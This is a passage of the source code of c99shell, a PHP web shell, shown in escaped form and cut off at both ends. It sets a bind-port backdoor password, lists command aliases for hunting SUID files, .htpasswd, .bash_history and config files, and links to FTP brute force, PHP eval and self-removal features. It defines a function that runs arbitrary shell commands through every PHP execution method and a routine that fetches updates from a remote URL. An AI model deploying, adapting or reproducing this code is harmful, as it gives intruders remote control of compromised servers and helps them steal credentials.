*\\/\\r\\n$donated_act = array(&quot;&quot;); \\/\\/array (&quot;act1&quot;,&quot;act2,&quot;...), if $act is in this array, display $donated_html.\\r\\n\\r\\n$curdir = &quot;.\\/&quot;; \\/\\/start directory\\r\\n\\/\\/$curdir = getenv(&quot;DOCUMENT_ROOT&quot;);\\r\\n$tmpdir = &quot;&quot;; \\/\\/Directory for tempory files. If empty, auto-fill (\\/tmp or %WINDIR\\/temp)\\r\\n$tmpdir_log = &quot;.\\/&quot;; \\/\\/Directory logs of long processes (e.g. brute, scan...)\\r\\n\\r\\n$log_email = &quot;user@host.tld&quot;; \\/\\/Default e-mail for sending logs\\r\\n\\r\\n$sort_default = &quot;0a&quot;; \\/\\/Default sorting, 0 - number of colomn, &quot;a&quot;scending or &quot;d&quot;escending\\r\\n$sort_save = true; \\/\\/If true then save sorting-type.\\r\\n\\r\\n\\/\\/ Registered file-types.\\r\\n\\/\\/  array(\\r\\n\\/\\/   &quot;{action1}&quot;=&gt;array(&quot;ext1&quot;,&quot;ext2&quot;,&quot;ext3&quot;,...),\\r\\n\\/\\/   &quot;{action2}&quot;=&gt;array(&quot;ext4&quot;,&quot;ext5&quot;,&quot;ext6&quot;,...),\\r\\n\\/\\/   ...\\r\\n\\/\\/  )\\r\\n$ftypes  = array(\\r\\n &quot;html&quot;=&gt;array(&quot;html&quot;,&quot;htm&quot;,&quot;shtml&quot;),\\r\\n &quot;txt&quot;=&gt;array(&quot;txt&quot;,&quot;conf&quot;,&quot;bat&quot;,&quot;sh&quot;,&quot;js&quot;,&quot;bak&quot;,&quot;doc&quot;,&quot;log&quot;,&quot;sfc&quot;,&quot;cfg&quot;,&quot;htaccess&quot;),\\r\\n &quot;exe&quot;=&gt;array(&quot;sh&quot;,&quot;install&quot;,&quot;bat&quot;,&quot;cmd&quot;),\\r\\n &quot;ini&quot;=&gt;array(&quot;ini&quot;,&quot;inf&quot;),\\r\\n &quot;code&quot;=&gt;array(&quot;php&quot;,&quot;phtml&quot;,&quot;php3&quot;,&quot;php4&quot;,&quot;inc&quot;,&quot;tcl&quot;,&quot;h&quot;,&quot;c&quot;,&quot;cpp&quot;,&quot;py&quot;,&quot;cgi&quot;,&quot;pl&quot;),\\r\\n &quot;img&quot;=&gt;array(&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;,&quot;jfif&quot;,&quot;jpg&quot;,&quot;jpe&quot;,&quot;bmp&quot;,&quot;ico&quot;,&quot;tif&quot;,&quot;tiff&quot;,&quot;avi&quot;,&quot;mpg&quot;,&quot;mpeg&quot;),\\r\\n &quot;sdb&quot;=&gt;array(&quot;sdb&quot;),\\r\\n &quot;phpsess&quot;=&gt;array(&quot;sess&quot;),\\r\\n &quot;download&quot;=&gt;array(&quot;exe&quot;,&quot;com&quot;,&quot;pif&quot;,&quot;src&quot;,&quot;lnk&quot;,&quot;zip&quot;,&quot;rar&quot;,&quot;gz&quot;,&quot;tar&quot;)\\r\\n);\\r\\n\\r\\n\\/\\/ Registered executable file-types.\\r\\n\\/\\/  array(\\r\\n\\/\\/   string &quot;command{i}&quot;=&gt;array(&quot;ext1&quot;,&quot;ext2&quot;,&quot;ext3&quot;,...),\\r\\n\\/\\/   ...\\r\\n\\/\\/  )\\r\\n\\/\\/   {command}: %f% = filename\\r\\n$exeftypes  = array(\\r\\n getenv(&quot;PHPRC&quot;).&quot; %f%&quot;=&gt;array(&quot;php&quot;,&quot;php3&quot;,&quot;php4&quot;),\\r\\n);\\r\\n\\r\\n\\/* Highlighted files.\\r\\n  array(\\r\\n   i=&gt;array({regexp},{type},{opentag},{closetag},{break})\\r\\n   ...\\r\\n  )\\r\\n  string {regexp} - regular exp.\\r\\n  int {type}:\\r\\n\\t0 - files and folders (as default),\\r\\n\\t1 - files only, 2 - folders only\\r\\n  string {opentag} - open html-tag, e.g. &quot;&lt;b&gt;&quot; (default)\\r\\n  string {closetag} - close html-tag, e.g. &quot;&lt;\\/b&gt;&quot; (default)\\r\\n  bool {break} - if true and found match then break\\r\\n*\\/\\r\\n$regxp_highlight  = array(\\r\\n  array(basename($_SERVER[&quot;PHP_SELF&quot;]),1,&quot;&lt;font color=\\\\&quot;yellow\\\\&quot;&gt;&quot;,&quot;&lt;\\/font&gt;&quot;), \\/\\/ example\\r\\n  array(&quot;config.php&quot;,1) \\/\\/ example\\r\\n);\\r\\n\\r\\n$safemode_diskettes = array(&quot;a&quot;); \\/\\/ This variable for disabling diskett-errors.\\r\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t \\/\\/ array (i=&gt;{letter} ...); string {letter} - letter of a drive\\r\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\/\\/ Set as false or for turn off.\\r\\n$hexdump_lines = 8;\\t\\/\\/ lines in hex preview file\\r\\n$hexdump_rows = 24;\\t\\/\\/ 16, 24 or 32 bytes in one line\\r\\n\\r\\n$nixpwdperpage = 100; \\/\\/ Get first N lines from \\/etc\\/passwd\\r\\n\\r\\n$bindport_pass = &quot;c99&quot;;\\t  \\/\\/ default password for binding\\r\\n$bindport_port = &quot;11457&quot;; \\/\\/ default port for binding\\r\\n\\r\\n\\/\\/ Command-aliases\\r\\nif (!$win)\\r\\n{\\r\\n $cmdaliases = array(\\r\\n  array(&quot;-----------------------------------------------------------&quot;, &quot;ls -la&quot;),\\r\\n  array(&quot;find all suid files&quot;, &quot;find \\/ -type f -perm -04000 -ls&quot;),\\r\\n  array(&quot;find suid files in current dir&quot;, &quot;find . -type f -perm -04000 -ls&quot;),\\r\\n  array(&quot;find all sgid files&quot;, &quot;find \\/ -type f -perm -02000 -ls&quot;),\\r\\n  array(&quot;find sgid files in current dir&quot;, &quot;find . -type f -perm -02000 -ls&quot;),\\r\\n  array(&quot;find config.inc.php files&quot;, &quot;find \\/ -type f -name config.inc.php&quot;),\\r\\n  array(&quot;find config* files&quot;, &quot;find \\/ -type f -name \\\\&quot;config*\\\\&quot;&quot;),\\r\\n  array(&quot;find config* files in current dir&quot;, &quot;find . -type f -name \\\\&quot;config*\\\\&quot;&quot;),\\r\\n  array(&quot;find all writable directories and files&quot;, &quot;find \\/ -perm -2 -ls&quot;),\\r\\n  array(&quot;find all writable directories and files in current dir&quot;, &quot;find . -perm -2 -ls&quot;),\\r\\n  array(&quot;find all service.pwd files&quot;, &quot;find \\/ -type f -name service.pwd&quot;),\\r\\n  array(&quot;find service.pwd files in current dir&quot;, &quot;find . -type f -name service.pwd&quot;),\\r\\n  array(&quot;find all .htpasswd files&quot;, &quot;find \\/ -type f -name .htpasswd&quot;),\\r\\n  array(&quot;find .htpasswd files in current dir&quot;, &quot;find . -type f -name .htpasswd&quot;),\\r\\n  array(&quot;find all .bash_history files&quot;, &quot;find \\/ -type f -name .bash_history&quot;),\\r\\n  array(&quot;find .bash_history files in current dir&quot;, &quot;find . -type f -name .bash_history&quot;),\\r\\n  array(&quot;find all .fetchmailrc files&quot;, &quot;find \\/ -type f -name .fetchmailrc&quot;),\\r\\n  array(&quot;find .fetchmailrc files in current dir&quot;, &quot;find . -type f -name .fetchmailrc&quot;),\\r\\n  array(&quot;list file attributes on a Linux second extended file system&quot;, &quot;lsattr -va&quot;),\\r\\n  array(&quot;show opened ports&quot;, &quot;netstat -an | grep -i listen&quot;)\\r\\n );\\r\\n}\\r\\nelse\\r\\n{\\r\\n $cmdaliases = array(\\r\\n  array(&quot;-----------------------------------------------------------&quot;, &quot;dir&quot;),\\r\\n  array(&quot;show opened ports&quot;, &quot;netstat -an&quot;)\\r\\n );\\r\\n}\\r\\n\\r\\n$sess_cookie = &quot;c99shvars&quot;; \\/\\/ Cookie-variable name\\r\\n\\r\\n$usefsbuff = true; \\/\\/Buffer-function\\r\\n$copy_unset = false; \\/\\/Remove copied files from buffer after pasting\\r\\n\\r\\n\\/\\/Quick launch\\r\\n$quicklaunch = array(\\r\\n array(&quot;&lt;img src=\\\\&quot;&quot;.$surl.&quot;act=img&amp;img=home\\\\&quot; alt=\\\\&quot;Home\\\\&quot; height=\\\\&quot;20\\\\&quot; width=\\\\&quot;20\\\\&quot; border=\\\\&quot;0\\\\&quot;&gt;&quot;,$surl),\\r\\n array(&quot;&lt;img src=\\\\&quot;&quot;.$surl.&quot;act=img&amp;img=back\\\\&quot; alt=\\\\&quot;Back\\\\&quot; height=\\\\&quot;20\\\\&quot; width=\\\\&quot;20\\\\&quot; border=\\\\&quot;0\\\\&quot;&gt;&quot;,&quot;#\\\\&quot; onclick=\\\\&quot;history.back(1)&quot;),\\r\\n array(&quot;&lt;img src=\\\\&quot;&quot;.$surl.&quot;act=img&amp;img=forward\\\\&quot; alt=\\\\&quot;Forward\\\\&quot; height=\\\\&quot;20\\\\&quot; width=\\\\&quot;20\\\\&quot; border=\\\\&quot;0\\\\&quot;&gt;&quot;,&quot;#\\\\&quot; onclick=\\\\&quot;history.go(1)&quot;),\\r\\n array(&quot;&lt;img src=\\\\&quot;&quot;.$surl.&quot;act=img&amp;img=up\\\\&quot; alt=\\\\&quot;UPDIR\\\\&quot; height=\\\\&quot;20\\\\&quot; width=\\\\&quot;20\\\\&quot; border=\\\\&quot;0\\\\&quot;&gt;&quot;,$surl.&quot;act=ls&amp;d=%upd&amp;sort=%sort&quot;),\\r\\n array(&quot;&lt;img src=\\\\&quot;&quot;.$surl.&quot;act=img&amp;img=refresh\\\\&quot; alt=\\\\&quot;Refresh\\\\&quot; height=\\\\&quot;20\\\\&quot; width=\\\\&quot;17\\\\&quot; border=\\\\&quot;0\\\\&quot;&gt;&quot;,&quot;&quot;),\\r\\n array(&quot;&lt;img src=\\\\&quot;&quot;.$surl.&quot;act=img&amp;img=search\\\\&quot; alt=\\\\&quot;Search\\\\&quot; height=\\\\&quot;20\\\\&quot; width=\\\\&quot;20\\\\&quot; border=\\\\&quot;0\\\\&quot;&gt;&quot;,$surl.&quot;act=search&amp;d=%d&quot;),\\r\\n array(&quot;&lt;img src=\\\\&quot;&quot;.$surl.&quot;act=img&amp;img=buffer\\\\&quot; alt=\\\\&quot;Buffer\\\\&quot; height=\\\\&quot;20\\\\&quot; width=\\\\&quot;20\\\\&quot; border=\\\\&quot;0\\\\&quot;&gt;&quot;,$surl.&quot;act=fsbuff&amp;d=%d&quot;),\\r\\n array(&quot;&lt;b&gt;Encoder&lt;\\/b&gt;&quot;,$surl.&quot;act=encoder&amp;d=%d&quot;),\\r\\n array(&quot;&lt;b&gt;Bind&lt;\\/b&gt;&quot;,$surl.&quot;act=bind&amp;d=%d&quot;),\\r\\n array(&quot;&lt;b&gt;Proc.&lt;\\/b&gt;&quot;,$surl.&quot;act=ps_aux&amp;d=%d&quot;),\\r\\n array(&quot;&lt;b&gt;FTP brute&lt;\\/b&gt;&quot;,$surl.&quot;act=ftpquickbrute&amp;d=%d&quot;),\\r\\n array(&quot;&lt;b&gt;Sec.&lt;\\/b&gt;&quot;,$surl.&quot;act=security&amp;d=%d&quot;),\\r\\n array(&quot;&lt;b&gt;SQL&lt;\\/b&gt;&quot;,$surl.&quot;act=sql&amp;d=%d&quot;),\\r\\n array(&quot;&lt;b&gt;PHP-code&lt;\\/b&gt;&quot;,$surl.&quot;act=eval&amp;d=%d&quot;),\\r\\n array(&quot;&lt;b&gt;Feedback&lt;\\/b&gt;&quot;,$surl.&quot;act=feedback&amp;d=%d&quot;),\\r\\n array(&quot;&lt;b&gt;Self remove&lt;\\/b&gt;&quot;,$surl.&quot;act=selfremove&quot;),\\r\\n array(&quot;&lt;b&gt;Logout&lt;\\/b&gt;&quot;,&quot;#\\\\&quot; onclick=\\\\&quot;if (confirm(\'Are you sure?\')) window.close()&quot;)\\r\\n);\\r\\n\\r\\n\\/\\/Highlight-code colors\\r\\n$highlight_background = &quot;#c0c0c0&quot;;\\r\\n$highlight_bg = &quot;#FFFFFF&quot;;\\r\\n$highlight_comment = &quot;#6A6A6A&quot;;\\r\\n$highlight_default = &quot;#0000BB&quot;;\\r\\n$highlight_html = &quot;#1300FF&quot;;\\r\\n$highlight_keyword = &quot;#007700&quot;;\\r\\n$highlight_string = &quot;#000000&quot;;\\r\\n\\r\\n@$f = $_REQUEST[&quot;f&quot;];\\r\\n@extract($_REQUEST[&quot;c99shcook&quot;]);\\r\\n\\r\\n\\/\\/END CONFIGURATION\\r\\n\\r\\n\\r\\n\\/\\/ \\t\\t\\t\\t\\\\\\/\\tNext code isn\'t for editing\\t\\\\\\/\\r\\n$tmp = array();\\r\\nforeach($host_allow as $k=&gt;$v) {$tmp[] = str_replace(&quot;\\\\\\\\*&quot;,&quot;.*&quot;,preg_quote($v));}\\r\\n$s = &quot;!^(&quot;.implode(&quot;|&quot;,$tmp).&quot;)$!i&quot;;\\r\\nif (!preg_match($s,getenv(&quot;REMOTE_ADDR&quot;)) and !preg_match($s,gethostbyaddr(getenv(&quot;REMOTE_ADDR&quot;)))) {exit(&quot;&lt;a href=\\\\&quot;http:\\/\\/ccteam.ru\\/releases\\/cc99shell\\\\&quot;&gt;c99shell&lt;\\/a&gt;: Access Denied - your host (&quot;.getenv(&quot;REMOTE_ADDR&quot;).&quot;) not allow&quot;);}\\r\\nif ($login)\\r\\n{\\r\\n if(empty($md5_pass)) {$md5_pass = md5($pass);}\\r\\n if (($_SERVER[&quot;PHP_AUTH_USER&quot;] != $login ) or (md5($_SERVER[&quot;PHP_AUTH_PW&quot;]) != $md5_pass))\\r\\n {\\r\\n  if ($login_txt === false) {$login_txt = &quot;&quot;;}\\r\\n  elseif (empty($login_txt)) {$login_txt = strip_tags(ereg_replace(&quot;&amp;nbsp;|&lt;br&gt;&quot;,&quot; &quot;,$donated_html));}\\r\\n  header(&quot;WWW-Authenticate: Basic realm=\\\\&quot;c99shell &quot;.$shver.&quot;: &quot;.$login_txt.&quot;\\\\&quot;&quot;);\\r\\n  header(&quot;HTTP\\/1.0 401 Unauthorized&quot;);\\r\\n  exit($accessdeniedmess);\\r\\n }\\r\\n}\\r\\nif ($act != &quot;img&quot;)\\r\\n{\\r\\n$lastdir = realpath(&quot;.&quot;);\\r\\nchdir($curdir);\\r\\nif (($selfwrite) or ($updatenow))\\r\\n{\\r\\n if ($selfwrite == &quot;1&quot;) {$selfwrite = &quot;c99shell.php&quot;;}\\r\\n c99sh_getupdate();\\r\\n $data = file_get_contents($c99sh_updatefurl);\\r\\n $fp = fopen($data,&quot;w&quot;);\\r\\n fwrite($fp,$data);\\r\\n fclose($fp);\\r\\n exit;\\r\\n}\\r\\n$sess_data = unserialize($_COOKIE[&quot;$sess_cookie&quot;]);\\r\\nif (!is_array($sess_data)) {$sess_data = array();}\\r\\nif (!is_array($sess_data[&quot;copy&quot;])) {$sess_data[&quot;copy&quot;] = array();}\\r\\nif (!is_array($sess_data[&quot;cut&quot;])) {$sess_data[&quot;cut&quot;] = array();}\\r\\n\\r\\nif (!function_exists(&quot;c99_buff_prepare&quot;))\\r\\n{\\r\\nfunction c99_buff_prepare()\\r\\n{\\r\\n global $sess_data;\\r\\n global $act;\\r\\n foreach($sess_data[&quot;copy&quot;] as $k=&gt;$v) {$sess_data[&quot;copy&quot;][$k] = str_replace(&quot;\\\\\\\\&quot;,DIRECTORY_SEPARATOR,realpath($v));} \\r\\n foreach($sess_data[&quot;cut&quot;] as $k=&gt;$v) {$sess_data[&quot;cut&quot;][$k] = str_replace(&quot;\\\\\\\\&quot;,DIRECTORY_SEPARATOR,realpath($v));} \\r\\n $sess_data[&quot;copy&quot;] = array_unique($sess_data[&quot;copy&quot;]);\\r\\n $sess_data[&quot;cut&quot;] = array_unique($sess_data[&quot;cut&quot;]);\\r\\n sort($sess_data[&quot;copy&quot;]);\\r\\n sort($sess_data[&quot;cut&quot;]);\\r\\n if ($act != &quot;copy&quot;) {foreach($sess_data[&quot;cut&quot;] as $k=&gt;$v) {if ($sess_data[&quot;copy&quot;][$k] == $v) {unset($sess_data[&quot;copy&quot;][$k]); }}}\\r\\n else {foreach($sess_data[&quot;copy&quot;] as $k=&gt;$v) {if ($sess_data[&quot;cut&quot;][$k] == $v) {unset($sess_data[&quot;cut&quot;][$k]);}}}\\r\\n}\\r\\n}\\r\\nc99_buff_prepare();\\r\\nif (!function_exists(&quot;c99_sess_put&quot;))\\r\\n{\\r\\nfunction c99_sess_put($data)\\r\\n{\\r\\n global $sess_cookie;\\r\\n global $sess_data;\\r\\n c99_buff_prepare();\\r\\n $sess_data = $data;\\r\\n $data = serialize($data);\\r\\n setcookie($sess_cookie,$data);\\r\\n}\\r\\n}\\r\\nif ($sort_save)\\r\\n{\\r\\n if (!empty($sort)) {setcookie(&quot;sort&quot;,$sort);}\\r\\n if (!empty($sql_sort)) {setcookie(&quot;sql_sort&quot;,$sql_sort);}\\r\\n}\\r\\nif (!function_exists(&quot;str2mini&quot;))\\r\\n{\\r\\nfunction str2mini($content,$len)\\r\\n{\\r\\n if (strlen($content) &gt; $len) \\r\\n {\\r\\n  $len = ceil($len\\/2) - 2;\\r\\n  return substr($content, 0, $len).&quot;...&quot;.substr($content, -$len);\\r\\n }\\r\\n else {return $content;}\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;view_size&quot;))\\r\\n{\\r\\nfunction view_size($size)\\r\\n{\\r\\n if (!is_numeric($size)) {return false;}\\r\\n else\\r\\n {\\r\\n  if ($size &gt;= 1073741824) {$size = round($size\\/1073741824*100)\\/100 .&quot; GB&quot;;}\\r\\n  elseif ($size &gt;= 1048576) {$size = round($size\\/1048576*100)\\/100 .&quot; MB&quot;;}\\r\\n  elseif ($size &gt;= 1024) {$size = round($size\\/1024*100)\\/100 .&quot; KB&quot;;}\\r\\n  else {$size = $size . &quot; B&quot;;}\\r\\n  return $size;\\r\\n }\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;fs_copy_dir&quot;))\\r\\n{\\r\\nfunction fs_copy_dir($d,$t)\\r\\n{\\r\\n $d = str_replace(&quot;\\\\\\\\&quot;,DIRECTORY_SEPARATOR,$d);\\r\\n if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}\\r\\n $h = opendir($d);\\r\\n while (($o = readdir($h)) !== false)\\r\\n {\\r\\n  if (($o != &quot;.&quot;) and ($o != &quot;..&quot;))\\r\\n  {\\r\\n   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}\\r\\n   else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}\\r\\n   if (!$ret) {return $ret;}\\r\\n  }\\r\\n }\\r\\n closedir($h);\\r\\n return true;\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;fs_copy_obj&quot;))\\r\\n{\\r\\nfunction fs_copy_obj($d,$t)\\r\\n{\\r\\n $d = str_replace(&quot;\\\\\\\\&quot;,DIRECTORY_SEPARATOR,$d);\\r\\n $t = str_replace(&quot;\\\\\\\\&quot;,DIRECTORY_SEPARATOR,$t);\\r\\n if (!is_dir(dirname($t))) {mkdir(dirname($t));}\\r\\n if (is_dir($d))\\r\\n {\\r\\n  if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}\\r\\n  if (substr($t,-1,1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}\\r\\n  return fs_copy_dir($d,$t);\\r\\n }\\r\\n elseif (is_file($d)) {return copy($d,$t);}\\r\\n else {return false;}\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;fs_move_dir&quot;))\\r\\n{\\r\\nfunction fs_move_dir($d,$t)\\r\\n{\\r\\n $h = opendir($d);\\r\\n if (!is_dir($t)) {mkdir($t);}\\r\\n while (($o = readdir($h)) !== false)\\r\\n {\\r\\n  if (($o != &quot;.&quot;) and ($o != &quot;..&quot;))\\r\\n  {\\r\\n   $ret = true;\\r\\n   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}\\r\\n   else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = false;}}\\r\\n   if (!$ret) {return $ret;}\\r\\n  }\\r\\n }\\r\\n closedir($h);\\r\\n return true;\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;fs_move_obj&quot;))\\r\\n{\\r\\nfunction fs_move_obj($d,$t)\\r\\n{\\r\\n $d = str_replace(&quot;\\\\\\\\&quot;,DIRECTORY_SEPARATOR,$d);\\r\\n $t = str_replace(&quot;\\\\\\\\&quot;,DIRECTORY_SEPARATOR,$t);\\r\\n if (is_dir($d))\\r\\n {\\r\\n  if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}\\r\\n  if (substr($t,-1,1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}\\r\\n  return fs_move_dir($d,$t);\\r\\n }\\r\\n elseif (is_file($d))\\r\\n {\\r\\n  if(copy($d,$t)) {return unlink($d);}\\r\\n  else {unlink($t); return false;}\\r\\n }\\r\\n else {return false;}\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;fs_rmdir&quot;))\\r\\n{\\r\\nfunction fs_rmdir($d)\\r\\n{\\r\\n $h = opendir($d);\\r\\n while (($o = readdir($h)) !== false)\\r\\n {\\r\\n  if (($o != &quot;.&quot;) and ($o != &quot;..&quot;))\\r\\n  {\\r\\n   if (!is_dir($d.$o)) {unlink($d.$o);}\\r\\n   else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}\\r\\n  }\\r\\n }\\r\\n closedir($h);\\r\\n rmdir($d);\\r\\n return !is_dir($d);\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;fs_rmobj&quot;))\\r\\n{\\r\\nfunction fs_rmobj($o)\\r\\n{\\r\\n $o = str_replace(&quot;\\\\\\\\&quot;,DIRECTORY_SEPARATOR,$o);\\r\\n if (is_dir($o))\\r\\n {\\r\\n  if (substr($o,-1,1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}\\r\\n  return fs_rmdir($o);\\r\\n }\\r\\n elseif (is_file($o)) {return unlink($o);}\\r\\n else {return false;}\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;myshellexec&quot;))\\r\\n{\\r\\nfunction myshellexec($cmd)\\r\\n{ \\r\\n $result = &quot;&quot;;\\r\\n if (!empty($cmd))\\r\\n {\\r\\n  if (is_callable(&quot;exec&quot;)) {exec($cmd,$result); $result = join(&quot;\\\\n&quot;,$result);}\\r\\n  elseif (is_callable(&quot;shell_exec&quot;)) {$result = shell_exec($cmd);}\\r\\n  elseif (is_callable(&quot;system&quot;)) {@ob_start(); system($cmd); $result = @ob_get_contents(); @ob_end_clean();}\\r\\n  elseif (is_callable(&quot;passthru&quot;)) {@ob_start(); passthru($cmd); $result = @ob_get_contents(); @ob_end_clean();}\\r\\n  elseif (($result = `$cmd`) !== false) {}\\r\\n  elseif (is_resource($fp = popen($cmd,&quot;r&quot;)))\\r\\n  {\\r\\n   $result = &quot;&quot;;\\r\\n   while(!feof($fp)) {$result .= fread($fp,1024);}\\r\\n   pclose($fp);\\r\\n  }\\r\\n }\\r\\n return $result;\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;tabsort&quot;))\\r\\n{\\r\\n function tabsort($a,$b) {global $v; return strnatcmp($a[$v], $b[$v]);}\\r\\n}\\r\\nif (!function_exists(&quot;view_perms&quot;))\\r\\n{\\r\\nfunction view_perms($mode)\\r\\n{\\r\\n if (($mode &amp; 0xC000) === 0xC000) {$type = &quot;s&quot;;}\\r\\n elseif (($mode &amp; 0x4000) === 0x4000) {$type = &quot;d&quot;;}\\r\\n elseif (($mode &amp; 0xA000) === 0xA000) {$type = &quot;l&quot;;}\\r\\n elseif (($mode &amp; 0x8000) === 0x8000) {$type = &quot;-&quot;;} \\r\\n elseif (($mode &amp; 0x6000) === 0x6000) {$type = &quot;b&quot;;}\\r\\n elseif (($mode &amp; 0x2000) === 0x2000) {$type = &quot;c&quot;;}\\r\\n elseif (($mode &amp; 0x1000) === 0x1000) {$type = &quot;p&quot;;}\\r\\n else {$type = &quot;?&quot;;}\\r\\n\\r\\n $owner[&quot;read&quot;] = ($mode &amp; 00400) ? &quot;r&quot; : &quot;-&quot;; \\r\\n $owner[&quot;write&quot;] = ($mode &amp; 00200) ? &quot;w&quot; : &quot;-&quot;; \\r\\n $owner[&quot;execute&quot;] = ($mode &amp; 00100) ? &quot;x&quot; : &quot;-&quot;; \\r\\n $group[&quot;read&quot;] = ($mode &amp; 00040) ? &quot;r&quot; : &quot;-&quot;; \\r\\n $group[&quot;write&quot;] = ($mode &amp; 00020) ? &quot;w&quot; : &quot;-&quot;; \\r\\n $group[&quot;execute&quot;] = ($mode &amp; 00010) ? &quot;x&quot; : &quot;-&quot;; \\r\\n $world[&quot;read&quot;] = ($mode &amp; 00004) ? &quot;r&quot; : &quot;-&quot;; \\r\\n $world[&quot;write&quot;] = ($mode &amp; 00002) ? &quot;w&quot; : &quot;-&quot;; \\r\\n $world[&quot;execute&quot;] = ($mode &amp; 00001) ? &quot;x&quot; : &quot;-&quot;; \\r\\n\\r\\n if( $mode &amp; 0x800 ) {$owner[&quot;execute&quot;] = ($owner[&quot;execute&quot;] == &quot;x&quot;) ? &quot;s&quot; : &quot;S&quot;;}\\r\\n if( $mode &amp; 0x400 ) {$group[&quot;execute&quot;] = ($group[&quot;execute&quot;] == &quot;x&quot;) ? &quot;s&quot; : &quot;S&quot;;}\\r\\n if( $mode &amp; 0x200 ) {$world[&quot;execute&quot;] = ($world[&quot;execute&quot;] == &quot;x&quot;) ? &quot;t&quot; : &quot;T&quot;;}\\r\\n\\r\\n return $type.$owner[&quot;read&quot;].$owner[&quot;write&quot;].$owner[&quot;execute&quot;].\\r\\n        $group[&quot;read&quot;].$group[&quot;write&quot;].$group[&quot;execute&quot;].\\r\\n        $world[&quot;read&quot;].$world[&quot;write&quot;].$world[&quot;execute&quot;];\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;parse_perms&quot;))\\r\\n{\\r\\nfunction parse_perms($mode)\\r\\n{\\r\\n if (($mode &amp; 0xC000) === 0xC000) {$t = &quot;s&quot;;}\\r\\n elseif (($mode &amp; 0x4000) === 0x4000) {$t = &quot;d&quot;;}\\r\\n elseif (($mode &amp; 0xA000) === 0xA000) {$t = &quot;l&quot;;}\\r\\n elseif (($mode &amp; 0x8000) === 0x8000) {$t = &quot;-&quot;;} \\r\\n elseif (($mode &amp; 0x6000) === 0x6000) {$t = &quot;b&quot;;}\\r\\n elseif (($mode &amp; 0x2000) === 0x2000) {$t = &quot;c&quot;;}\\r\\n elseif (($mode &amp; 0x1000) === 0x1000) {$t = &quot;p&quot;;}\\r\\n else {$t = &quot;?&quot;;}\\r\\n $o[&quot;r&quot;] = ($mode &amp; 00400) &gt; 0; $o[&quot;w&quot;] = ($mode &amp; 00200) &gt; 0; $o[&quot;x&quot;] = ($mode &amp; 00100) &gt; 0;\\r\\n $g[&quot;r&quot;] = ($mode &amp; 00040) &gt; 0; $g[&quot;w&quot;] = ($mode &amp; 00020) &gt; 0; $g[&quot;x&quot;] = ($mode &amp; 00010) &gt; 0;\\r\\n $w[&quot;r&quot;] = ($mode &amp; 00004) &gt; 0; $w[&quot;w&quot;] = ($mode &amp; 00002) &gt; 0; $w[&quot;x&quot;] = ($mode &amp; 00001) &gt; 0;\\r\\n return array(&quot;t&quot;=&gt;$t,&quot;o&quot;=&gt;$o,&quot;g&quot;=&gt;$g,&quot;w&quot;=&gt;$w);\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;view_perms_color&quot;))\\r\\n{\\r\\nfunction view_perms_color($o)\\r\\n{\\r\\n if (!is_readable($o)) {return &quot;&lt;font color=\\\\&quot;red\\\\&quot;&gt;&quot;.view_perms(fileperms($o)).&quot;&lt;\\/font&gt;&quot;;}\\r\\n elseif (!is_writable($o)) {return &quot;&lt;font color=\\\\&quot;white\\\\&quot;&gt;&quot;.view_perms(fileperms($o)).&quot;&lt;\\/font&gt;&quot;;}\\r\\n else {return &quot;&lt;font color=\\\\&quot;green\\\\&quot;&gt;&quot;.view_perms(fileperms($o)).&quot;&lt;\\/font&gt;&quot;;}\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;gchds&quot;)) {function gchds($a,$b,$c,$d=&quot;&quot;) {if ($a == $b) {return $c;} else {return $d;}}}\\r\\nif (!function_exists(&quot;c99sh_getupdate&quot;))\\r\\n{\\r\\nfunction c99sh_getupdate()\\r\\n{\\r\\n global $updatenow;\\r\\n $data = @file_get_contents($c99sh_updatefurl.&quot;?version=&quot;.$shver.&quot;&amp;&quot;);\\r\\n if (!$data) {echo &quot;Can\'t fetch update-information!&quot;;}\\r\\n else\\r\\n {\\r\\n  $data = unserialize(base64_decode($data));\\r\\n  if (!is_array($data)) {echo &quot;Corrupted update-information!&quot;;}\\r\\n  elseif ($shver &lt; $data[&quot;cur&quot;]) {$updatenow = true;}\\r\\n }\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;mysql_dump&quot;))\\r\\n{\\r\\nfunction mysql_dump($set)\\r\\n{\\r\\n global $shver;\\r\\n $sock = $set[&quot;sock&quot;];\\r\\n $db = $set[&quot;db&quot;];\\r\\n $print = $set[&quot;print&quot;];\\r\\n $nl2br = $set[&quot;nl2br&quot;];\\r\\n $file = $set[&quot;file&quot;];\\r\\n $add_drop = $set[&quot;add_drop&quot;];\\r\\n $tabs = 